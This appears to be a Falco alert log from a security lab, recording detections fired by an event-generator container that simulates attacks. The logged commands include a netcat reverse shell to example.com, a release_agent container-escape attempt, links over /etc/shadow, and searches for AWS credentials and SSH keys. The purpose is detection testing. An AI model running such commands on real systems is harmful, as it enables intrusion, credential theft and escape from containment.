2026-04-06T19:09:48.839682574Z	Warning	Write Binary Under UsrLocalBin	2026-04-06T19:09:48.839682574+0000: Warning Falco Custom: File write in /usr/local/bin (container=lab9-helper user=root file=/usr/local/bin/drift.txt flags=O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY|O_F_CREATED|FD_UPPER_LAYER) container_id=13c5e802dbf9 container_name=lab9-helper container_image_repository=alpine container_image_tag=3.19 k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:10:07.912727790Z	Warning	Write Binary Under UsrLocalBin	2026-04-06T19:10:07.912727790+0000: Warning Falco Custom: File write in /usr/local/bin (container=lab9-helper user=root file=/usr/local/bin/custom-rule.txt flags=O_LARGEFILE|O_TRUNC|O_CREAT|O_WRONLY|O_F_CREATED|FD_UPPER_LAYER) container_id=13c5e802dbf9 container_name=lab9-helper container_image_repository=alpine container_image_tag=3.19 k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:15:21.952559663Z	Notice	Terminal shell in container	2026-04-06T19:15:21.952559663+0000: Notice A shell was spawned in a container with an attached terminal | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=containerd-shim command=sh -lc echo baseline-shell && id terminal=34816 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=13c5e802dbf9 container_name=lab9-helper container_image_repository=alpine container_image_tag=3.19 k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:29.292263234Z	Critical	Detect release_agent File Container Escapes	2026-04-06T19:16:29.292263234+0000: Critical Detect an attempt to exploit a container escape using release_agent file | file=/release_agent cap_effective=CAP_CHOWN CAP_DAC_OVERRIDE CAP_DAC_READ_SEARCH CAP_FOWNER CAP_FSETID CAP_KILL CAP_SETGID CAP_SETUID CAP_SETPCAP CAP_LINUX_IMMUTABLE CAP_NET_BIND_SERVICE CAP_NET_BROADCAST CAP_NET_ADMIN CAP_NET_RAW CAP_IPC_LOCK CAP_IPC_OWNER CAP_SYS_MODULE CAP_SYS_RAWIO CAP_SYS_CHROOT CAP_SYS_PTRACE CAP_SYS_PACCT CAP_SYS_ADMIN CAP_SYS_BOOT CAP_SYS_NICE CAP_SYS_RESOURCE CAP_SYS_TIME CAP_SYS_TTY_CONFIG CAP_MKNOD CAP_LEASE CAP_AUDIT_WRITE CAP_AUDIT_CONTROL CAP_SETFCAP CAP_MAC_OVERRIDE CAP_MAC_ADMIN CAP_SYSLOG CAP_WAKE_ALARM CAP_BLOCK_SUSPEND CAP_AUDIT_READ CAP_PERFMON CAP_BPF CAP_CHECKPOINT_RESTORE evt_type=open user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c echo 'hello world' > release_agent terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:29.418654903Z	Warning	Create Hardlink Over Sensitive Files	2026-04-06T19:16:29.418654903+0000: Warning Hardlinks created over sensitive files | target=/etc/shadow linkpath=/tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3717674860/shadow_link evt_type=link user=root user_uid=0 user_loginuid=-1 process=ln proc_exepath=/bin/busybox parent=event-generator command=ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3717674860/shadow_link terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:29.520422094Z	Warning	Find AWS Credentials	2026-04-06T19:16:29.520422094+0000: Warning Detected AWS credentials search activity | proc_pcmdline=event-generator run syscall proc_cwd=/ group_gid=0 group_name=root user_loginname=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=find proc_exepath=/bin/busybox parent=event-generator command=find /tmp -maxdepth 1 -iname .aws/credentials terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:29.621703234Z	Warning	Directory traversal monitored file read	2026-04-06T19:16:29.621703234+0000: Warning Read monitored file via directory traversal | file=/etc/shadow fileraw=/etc/../etc/../etc/shadow gparent=systemd ggparent=<NA> gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:29.950349541Z	Notice	Run shell untrusted	2026-04-06T19:16:29.950349541+0000: Notice Shell spawned by untrusted binary | parent_exe=/tmp/falco-event-generator-syscall-spawned-1943411397/httpd parent_exepath=/bin/event-generator pcmdline=httpd --loglevel info run ^helper.RunShell$ gparent=event-generator ggparent=containerd-shim aname[4]=systemd aname[5]=<NA> aname[6]=<NA> aname[7]=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=httpd command=sh -c ls > /dev/null terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:36.086992061Z	Warning	Read sensitive file trusted after startup	2026-04-06T19:16:36.086992061+0000: Warning Sensitive file opened for reading by trusted program after startup | file=/etc/shadow pcmdline=event-generator run syscall gparent=containerd-shim ggparent=systemd gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=httpd proc_exepath=/bin/event-generator parent=event-generator command=httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:36.302799549Z	Warning	Clear Log Activities	2026-04-06T19:16:36.302799549+0000: Warning Log files were tampered | file=/tmp/falco-event-generator-syscall-ClearLogActivities-2340747492/syslog evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:36.404172353Z	Warning	Search Private Keys or Passwords	2026-04-06T19:16:36.404172353+0000: Warning Grep private keys or passwords activities found | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=find proc_exepath=/bin/busybox parent=event-generator command=find /tmp -maxdepth 1 -iname id_rsa terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:36.505177058Z	Warning	Read sensitive file untrusted	2026-04-06T19:16:36.505177058+0000: Warning Sensitive file opened for reading by non-trusted program | file=/etc/shadow gparent=systemd ggparent=<NA> gggparent=<NA> evt_type=openat user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:36.606274085Z	Warning	Remove Bulk Data from Disk	2026-04-06T19:16:36.606274085+0000: Warning Bulk data has been removed from disk | file=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=shred proc_exepath=/bin/busybox parent=event-generator command=shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-2764725704 terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:36.723005745Z	Warning	Execution from /dev/shm	2026-04-06T19:16:36.723005745+0000: Warning File execution detected from /dev/shm | evt_res=SUCCESS file=<NA> proc_cwd=/ proc_pcmdline=event-generator run syscall user_loginname=<NA> group_gid=0 group_name=root evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-7hk5c6.sh terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:36.723337866Z	Warning	Execution from /dev/shm	2026-04-06T19:16:36.723337866+0000: Warning File execution detected from /dev/shm | evt_res=EACCES file=<NA> proc_cwd=/ proc_pcmdline=event-generator run syscall user_loginname=<NA> group_gid=0 group_name=root evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-7hk5c6.sh terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:36.824495809Z	Warning	Netcat Remote Code Execution in Container	2026-04-06T19:16:36.824495809+0000: Warning Netcat runs inside container that allows remote code execution | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=nc proc_exepath=/usr/bin/nc parent=event-generator command=nc -e /bin/sh example.com 22 terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:36.926333905Z	Informational	System user interactive	2026-04-06T19:16:36.926333905+0000: Informational System user ran an interactive command | evt_type=execve user=daemon user_uid=2 user_loginuid=-1 process=login proc_exepath=/bin/busybox parent=event-generator command=login terminal=0 exe_flags=EXE_LOWER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:37.044008864Z	Critical	Drop and execute new binary in container	2026-04-06T19:16:37.044008864+0000: Critical Executing binary not part of base image | proc_exe=/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-l7iVvX proc_sname=event-generator gparent=containerd-shim proc_exe_ino_ctime=1775502997041295898 proc_exe_ino_mtime=1775502997041295898 proc_exe_ino_ctime_duration_proc_start=2281019 proc_cwd=/ container_start_ts=1775502988897152372 evt_type=execve user=root user_uid=0 user_loginuid=-1 process=falco-event-gen proc_exepath=/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-l7iVvX parent=event-generator command=falco-event-gen terminal=0 exe_flags=EXE_WRITABLE|EXE_UPPER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:37.146166789Z	Warning	PTRACE attached to process	2026-04-06T19:16:37.146166789+0000: Warning Detected ptrace PTRACE_ATTACH attempt | proc_pcmdline=containerd-shim -namespace moby -id b43fe15eef7bff94094b84da39dd5fa251f5aec99f3625b29ccdcdd611a6a51b -address /run/containerd/containerd.sock evt_type=ptrace user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:37.247224408Z	Notice	PTRACE anti-debug attempt	2026-04-06T19:16:37.247224408+0000: Notice Detected potential PTRACE_TRACEME anti-debug attempt | proc_pcmdline=event-generator run syscall evt_type=ptrace user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=event-generator command=event-generator run syscall terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:37.349138350Z	Warning	Create Symlink Over Sensitive Files	2026-04-06T19:16:37.349138350+0000: Warning Symlinks created over sensitive files | target=/etc linkpath=/tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3481213333/etc_link evt_type=symlink user=root user_uid=0 user_loginuid=-1 process=ln proc_exepath=/bin/busybox parent=event-generator command=ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3481213333/etc_link terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:37.456465895Z	Warning	Debugfs Launched in Privileged Container	2026-04-06T19:16:37.456465895+0000: Warning Debugfs launched started in a privileged container | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=debugfs proc_exepath=/usr/sbin/debugfs parent=event-generator command=debugfs -V terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:37.588344212Z	Notice	Disallowed SSH Connection Non Standard Port	2026-04-06T19:16:37.588344212+0000: Notice Disallowed SSH Connection | connection=172.17.0.5:34570->8.6.112.0:443 lport=443 rport=34570 fd_type=ipv4 fd_proto=tcp evt_type=connect user=root user_uid=0 user_loginuid=-1 process=ssh proc_exepath=/usr/bin/ssh parent=event-generator command=ssh user@example.com -p 443 terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:39.973907327Z	Notice	Packet socket created in container	2026-04-06T19:16:39.973907327+0000: Notice Packet socket was created in a container | socket_info=fd=6(<o>) domain=17(AF_PACKET) type=3 proto=3 connection= lport=<NA> rport=<NA> fd_type=<NA> fd_proto=<NA> evt_type=socket user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=containerd-shim command=event-generator run syscall terminal=0 container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:16:40.196949707Z	Critical	Fileless execution via memfd_create	2026-04-06T19:16:40.196949707+0000: Critical Fileless execution via memfd_create | container_start_ts=1775502988897152372 proc_cwd=/ evt_res=SUCCESS proc_sname=event-generator gparent=containerd-shim evt_type=execve user=root user_uid=0 user_loginuid=-1 process=3 proc_exepath=memfd:program parent=event-generator command=3 run helper.DoNothing terminal=0 exe_flags=EXE_WRITABLE|EXE_FROM_MEMFD container_id=b43fe15eef7b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:20:59.787923039Z	Critical	Detect release_agent File Container Escapes	2026-04-06T19:20:59.787923039+0000: Critical Detect an attempt to exploit a container escape using release_agent file | file=/release_agent cap_effective=CAP_CHOWN CAP_DAC_OVERRIDE CAP_DAC_READ_SEARCH CAP_FOWNER CAP_FSETID CAP_KILL CAP_SETGID CAP_SETUID CAP_SETPCAP CAP_LINUX_IMMUTABLE CAP_NET_BIND_SERVICE CAP_NET_BROADCAST CAP_NET_ADMIN CAP_NET_RAW CAP_IPC_LOCK CAP_IPC_OWNER CAP_SYS_MODULE CAP_SYS_RAWIO CAP_SYS_CHROOT CAP_SYS_PTRACE CAP_SYS_PACCT CAP_SYS_ADMIN CAP_SYS_BOOT CAP_SYS_NICE CAP_SYS_RESOURCE CAP_SYS_TIME CAP_SYS_TTY_CONFIG CAP_MKNOD CAP_LEASE CAP_AUDIT_WRITE CAP_AUDIT_CONTROL CAP_SETFCAP CAP_MAC_OVERRIDE CAP_MAC_ADMIN CAP_SYSLOG CAP_WAKE_ALARM CAP_BLOCK_SUSPEND CAP_AUDIT_READ CAP_PERFMON CAP_BPF CAP_CHECKPOINT_RESTORE evt_type=open user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c echo 'hello world' > release_agent terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:00.034082033Z	Notice	Run shell untrusted	2026-04-06T19:21:00.034082033+0000: Notice Shell spawned by untrusted binary | parent_exe=/tmp/falco-event-generator-syscall-spawned-560514706/httpd parent_exepath=/bin/event-generator pcmdline=httpd --loglevel info run ^helper.RunShell$ gparent=event-generator ggparent=containerd-shim aname[4]=systemd aname[5]=<NA> aname[6]=<NA> aname[7]=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=httpd command=sh -c ls > /dev/null terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:00.139845191Z	Notice	PTRACE anti-debug attempt	2026-04-06T19:21:00.139845191+0000: Notice Detected potential PTRACE_TRACEME anti-debug attempt | proc_pcmdline=event-generator run syscall evt_type=ptrace user=root user_uid=0 user_loginuid=-1 process=event-generator proc_exepath=/bin/event-generator parent=event-generator command=event-generator run syscall terminal=0 container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:00.248074595Z	Warning	Debugfs Launched in Privileged Container	2026-04-06T19:21:00.248074595+0000: Warning Debugfs launched started in a privileged container | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=debugfs proc_exepath=/usr/sbin/debugfs parent=event-generator command=debugfs -V terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:00.367615415Z	Critical	Drop and execute new binary in container	2026-04-06T19:21:00.367615415+0000: Critical Executing binary not part of base image | proc_exe=/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-SuIbVD proc_sname=event-generator gparent=containerd-shim proc_exe_ino_ctime=1775503260363891520 proc_exe_ino_mtime=1775503260363891520 proc_exe_ino_ctime_duration_proc_start=3241771 proc_cwd=/ container_start_ts=1775503259307759675 evt_type=execve user=root user_uid=0 user_loginuid=-1 process=falco-event-gen proc_exepath=/bin/falco-event-generator-syscall-DropAndExecuteNewBinaryInContainer-SuIbVD parent=event-generator command=falco-event-gen terminal=0 exe_flags=EXE_WRITABLE|EXE_UPPER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:00.470242589Z	Warning	Execution from /dev/shm	2026-04-06T19:21:00.470242589+0000: Warning File execution detected from /dev/shm | evt_res=SUCCESS file=<NA> proc_cwd=/ proc_pcmdline=event-generator run syscall user_loginname=<NA> group_gid=0 group_name=root evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-d1gBnq.sh terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:00.470763990Z	Warning	Execution from /dev/shm	2026-04-06T19:21:00.470763990+0000: Warning File execution detected from /dev/shm | evt_res=EACCES file=<NA> proc_cwd=/ proc_pcmdline=event-generator run syscall user_loginname=<NA> group_gid=0 group_name=root evt_type=execve user=root user_uid=0 user_loginuid=-1 process=sh proc_exepath=/bin/busybox parent=event-generator command=sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-d1gBnq.sh terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:00.572470191Z	Warning	Netcat Remote Code Execution in Container	2026-04-06T19:21:00.572470191+0000: Warning Netcat runs inside container that allows remote code execution | evt_type=execve user=root user_uid=0 user_loginuid=-1 process=nc proc_exepath=/usr/bin/nc parent=event-generator command=nc -e /bin/sh example.com 22 terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
2026-04-06T19:21:00.674468176Z	Warning	Find AWS Credentials	2026-04-06T19:21:00.674468176+0000: Warning Detected AWS credentials search activity | proc_pcmdline=event-generator run syscall proc_cwd=/ group_gid=0 group_name=root user_loginname=<NA> evt_type=execve user=root user_uid=0 user_loginuid=-1 process=find proc_exepath=/bin/busybox parent=event-generator command=find /tmp -maxdepth 1 -iname .aws/credentials terminal=0 exe_flags=EXE_WRITABLE|EXE_LOWER_LAYER container_id=ac039efe590b container_name=eventgen container_image_repository=falcosecurity/event-generator container_image_tag=latest k8s_pod_name=<NA> k8s_ns_name=<NA>
